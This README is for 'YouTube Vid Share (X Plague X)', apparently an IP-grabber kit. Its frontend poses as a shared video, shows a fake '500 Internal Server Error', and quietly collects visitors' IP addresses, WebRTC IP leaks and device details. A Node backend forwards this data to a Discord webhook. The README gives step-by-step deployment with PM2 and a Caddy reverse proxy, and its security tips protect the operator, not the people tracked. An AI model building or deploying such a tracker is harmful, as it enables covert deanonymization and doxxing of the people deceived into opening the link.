# YouTube Vid Share (X Plague X) — Full Source Code

This repository contains the complete source code for **YouTube Vid Share**, comprising both the frontend website and the Node.js backend API.

## Project Structure

- `frontend/`: The static HTML/JS frontend that runs in the browser.
  - `index.html`: Main page that simulates a "500 Internal Server Error" while gathering client-side system information (IP, WebRTC IP leaks, device specifications) and sending it to the backend.
  - `api/discord.js`: Legacy Serverless/Vercel function (optional).
  - `LICENSE` & `README.md`
- `backend/`: The self-hosted Node.js API server.
  - `server.js`: Standard HTTP server that listens on port `4821`, handles rate limiting, validates origins, parses incoming payload details, chunks long messages, and posts them safely to your Discord webhook.
  - `package.json`: Project configuration.
  - `ecosystem.config.cjs`: PM2 process manager configuration for easy production management.
  - `.env.example`: Template for environment secrets (Discord Webhook).

---

## Deployment Instructions

### 1. Backend API Setup

1. Copy the `backend/` folder to your server.
2. Install dependencies (standard Node.js `http` and `fetch` are built-in, no external dependencies needed!).
3. Create a `.env` file based on `.env.example`:
   ```env
   DISCORD_WEBHOOK=your_discord_webhook_url_here
   ```
4. Start the backend with PM2 to keep it running in the background:
   ```bash
   pm2 start ecosystem.config.cjs
   ```
   The backend will start and listen locally on `127.0.0.1:4821`.

### 2. Frontend & Web Server Setup (Caddy Example)

Configure your web server (e.g., Caddy) to serve the `frontend/` directory statically and reverse-proxy `/api/discord` requests to the backend.

Add the following to your `/etc/caddy/Caddyfile`:

```caddy
yourdomain.com {
    # Serve static frontend files
    root * /path/to/your/frontend
    file_server

    # Reverse proxy the Discord webhook API endpoint to the Node.js backend
    handle /api/discord {
        reverse_proxy 127.0.0.1:4821
    }

    # Block access to any other files inside /api/
    handle /api/* {
        respond 404
    }

    # Hide git files
    handle /.git* {
        respond 404
    }
}
```

Reload Caddy:
```bash
sudo systemctl reload caddy
```

---

## Security Recommendations

- **Keep Webhooks Private:** Never commit your actual `.env` file or leak the `DISCORD_WEBHOOK` URL in public repositories.
- **Origin Check:** The backend matches incoming request origins against `ALLOWED_ORIGIN`. Make sure to update `ALLOWED_ORIGIN` in `server.js` if you change your domain name.
